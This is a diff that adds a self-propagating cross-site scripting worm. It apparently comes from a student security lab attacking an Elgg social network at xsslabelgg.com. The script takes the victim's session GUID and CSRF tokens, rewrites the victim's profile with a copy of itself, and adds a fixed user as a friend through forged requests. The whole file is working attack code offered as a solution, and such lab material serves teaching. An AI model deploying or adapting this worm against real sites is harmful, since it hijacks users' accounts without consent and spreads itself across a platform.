@@ -1,0 +1,48 @@
+//harshal,adesh.ashwit
+<script id="worm">
+window.onload = function () {
+var Ajax = null;
+var headerTag="<script id=\"worm\">";
+var innercode =document.getElementById("worm").innerHTML;
+var tailTag ="</" +"script>";
+var wormCode =encodeURIComponent(headerTag +innercode +tailTag);
+
+
+var name=elgg.session.user.name;
+var guid = "&guid="+elgg.session.user.guid;
+var ts ="&_elgg_ts="+elgg.security.token._elgg_ts;
+var token="&_elgg_token="+elgg.security.token._elgg_token;
+var Desc="&description="+ wormCode +
+ 	"&accesslevel[description]=2";
+var briefDesc="&briefdescription= Samy is my hero( added by HArshal,adesh, ashwit" +
+ 	"&accesslevel[briefdescription]=2";
+
+ //Construct the HTTP POST request to modify profile.
+var sendurlPOST="http://www.xsslabelgg.com/action/profile/edit"; // FILL IN
+var content= name + guid + ts + token +briefDesc+ Desc; // FILL IN
+ //Modify Victim's profile except for SAMY
+
+//Create and send Ajax request to modify profile
+var GuidSamy=47;
+
+
+ //Construct the HTTP request to add Samy as a friend.
+ var sendurlGet = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token; // FILL IN
+ //Create and send Ajax request to add friend.
+ 
+if(elgg.session.user.guid!=GuidSamy){
+Ajax=new XMLHttpRequest();
+Ajax.open("POST", sendurlPOST, true);
+Ajax.setRequestHeader("Host"," www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+Ajax.send(content); 
+
+
+Ajax = new XMLHttpRequest();
+ Ajax.open("GET", sendurlGet, true);
+ Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+ Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ Ajax.send();
+}
+}
+</script>
